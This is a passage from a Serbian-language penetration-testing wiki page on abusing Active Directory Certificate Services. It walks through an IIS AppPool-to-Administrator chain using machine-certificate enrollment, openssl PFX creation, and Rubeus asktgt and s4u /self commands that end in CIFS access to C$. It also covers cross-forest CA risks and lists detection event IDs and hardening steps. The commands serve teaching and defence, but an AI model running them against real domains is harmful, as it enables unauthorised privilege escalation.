- Pošto se sertifikat mapira na **Domain Controller account**, naknadne radnje mogu uključivati **certificate-based Kerberos auth**, **DCSync** i ponovnu upotrebu oporavljenog **machine NT hash**-a.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment do Administratora na istom hostu

IIS pool koji radi kao `ApplicationPoolIdentity` koristi **computer account** svog hosta za outbound pristup mrežnim resursima. Zato izvršavanje koda kao `IIS AppPool\<POOL>` ostaje sa niskim privilegijama u lokalnom tokenu, ali može da pošalje AD CS zahtev koji CA autentifikuje kao `HOST$`; ovo je outbound identity transition, a ne token impersonation ili lokalna elevacija u Potato stilu.<sup>[[19]](#references)[[20]](#references)</sup>

Ovaj lanac zahteva IIS host pridružen domenu, Enterprise CA dostupan preko RPC-a, objavljen machine-authentication template za koji computer ima prava enrollment-a, PKINIT podršku i KDC/SMB dostupnost. Prilagođeni pool identity menja outbound principal, zato potvrdite da pool zaista koristi `ApplicationPoolIdentity` pre nego što pretpostavite `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment pomoću ključa pod kontrolom napadača

Generišite key pair i CSR izvan IIS servera i sačuvajte private key. Pošaljite **samo CSR** sa kompromitovanog worker-a. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancira `CertificateAuthority.Request`, postavlja `CertificateTemplate:Machine`, poziva `ICertRequest::Submit` i vraća izdati sertifikat. Koristite CA configuration string `CAHOST\CA-NAME`; normalan `Machine` template formira subject iz AD-a, tako da subject/SAN podaci koje dostavlja requester nisu potrebni.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Kombinujte vraćeni sertifikat sa **odgovarajućim sačuvanim ključem**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` radi samo kada Windows već može da poveže sertifikat sa dostupnim private key-em; za odvojene PEM fajlove, eksplicitno kreirajte PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Koristi PFX za PKINIT i zadrži vraćeni TGT računara u obliku base64 umesto da ga odmah ubaciš:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus zamena servisa na istom hostu

S4U2Self omogućava servisu da dobije ticket **za sebe** koji sadrži autorizacione podatke drugog korisnika. Sa računarskim TGT-om, Rubeus može da zatraži taj ticket za privilegovanog korisnika, promeni naziv servisa u vraćenom KRB-CRED-u u CIFS i ubaci ga. Ovo je lokalna primitiva „delegate to thyself“: ne zahteva S4U2Proxy niti unos `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Zamenjena karta može da se koristi samo za servise na **istom nalogu/ključu računara** (ovde, CIFS na `HOST`). To nije ponovo upotrebljiva Administrator karta za druge mašine u domenu. Takođe, prikazani rezultat predstavlja privilegovani SMB/pristup datotečnom sistemu kao Administrator; dobijanje lokalnog procesa `NT AUTHORITY\SYSTEM` i dalje zahteva zaseban korak udaljenog izvršavanja.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detekcija i hardening

- Na CA-u, povežite Certification Services događaje **4886** (zahtev primljen) i **4887** (izdat) za neočekivane zahteve na `Machine` template koje podnose nalozi IIS servera.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC-ovima, događaj **4768** uključuje polja sertifikata kada se koristi certificate pre-authentication; postavite upozorenje za neuobičajene PKINIT TGT zahteve za naloge web servera. Zatim proverite **4769** zahteve koji uključuju privilegovani impersonated identity i isti host. Pošto Rubeus `/altservice` prepisuje naziv servisa KRB-CRED-a na klijentskoj strani, naziv servisa u 4769 na strani DC-a ne treba nužno da bude `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Pratite da li `w3wp.exe` pristupa CA RPC endpointima, da li se neočekivano kreiraju ASPX fajlovi, da li se ostvaruje Kerberos-authenticated pristup administrativnim deljenim resursima i da li se vrši secrets-dumping. Ograničite pristup app-tier-a CA RPC/KDC/SMB servisima gde je to moguće i uklonite prava computer enrollment-a ili machine-authentication template koji nisu operativno neophodni.<sup>[[19]](#references)</sup>

## Kompromitovanje šuma pomoću sertifikata objašnjeno u pasivu

### Razbijanje forest trust-ova putem kompromitovanih CA-ova

Konfiguracija za **cross-forest enrollment** relativno se jednostavno podešava. Administratori **root CA sertifikat** iz resource forest-a **objavljuju u account forest-ovima**, a sertifikati **enterprise CA** iz resource forest-a **dodaju se u `NTAuthCertificates` i AIA kontejnere u svakom account forest-u**. Drugim rečima, ovim rasporedom se **CA-u u resource forest-u dodeljuje potpuna kontrola** nad svim drugim forest-ovima kojima upravlja putem PKI-ja. Ako ovaj CA bude **kompromitovan od strane napadača**, oni bi mogli da **krivotvore sertifikate za sve korisnike u resource i account forest-ovima**, čime bi bezbednosna granica forest-a bila narušena.<sup>[[6]](#references)</sup>

### Dodeljene enrollment privilegije stranim principalima

U multi-forest okruženjima potreban je oprez u vezi sa Enterprise CA-ovima koji **objavljuju certificate template** koji **Authenticated Users ili foreign principals** (korisnicima/grupama izvan forest-a kojem Enterprise CA pripada) omogućavaju **prava za enrollment i izmenu**.\
Prilikom autentikacije preko trust-a, AD dodaje **Authenticated Users SID** korisničkom tokenu. Zato, ako domen poseduje Enterprise CA sa template-om koji **Authenticated Users-ima omogućava enrollment prava**, korisnik iz drugog forest-a potencijalno bi mogao da izvrši **enrollment tog template-a**. Isto tako, ako template **izričito dodeljuje enrollment prava foreign principal-u**, time se **kreira cross-forest access-control odnos**, koji principal-u iz jednog forest-a omogućava da **izvrši enrollment template-a iz drugog forest-a**.

Oba scenarija dovode do **povećanja attack surface-a** između forest-ova. Napadač bi mogao da iskoristi podešavanja certificate template-a za dobijanje dodatnih privilegija u stranom domenu.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repozitorijum](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - tehnička analiza Certighost-a](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, novi načini autentikacije i zahteva i još mnogo toga](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Zloupotreba Key Trust Account Mapping-a za preuzimanje naloga](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Priča o Enhanced Key (mis)Usage-u](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying ka AD Certificate Services-u preko RPC-a](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell pristup ADCS CA-u sa YubiHSM-om](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Eskalacija privilegija (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Ne samo još jedan AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Pogrešna konfiguracija i exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Ponovno razmatranje „Delegate 2 Thyself“](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Eskalacija privilegija sa IIS AppPool-a preko AD CS RPC Endpoint-a](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identiteti application pool-ova](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 komanda](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Događaj 4768: Zatražena je Kerberos authentication karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Događaj 4769: Zatražena je Kerberos service karta](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
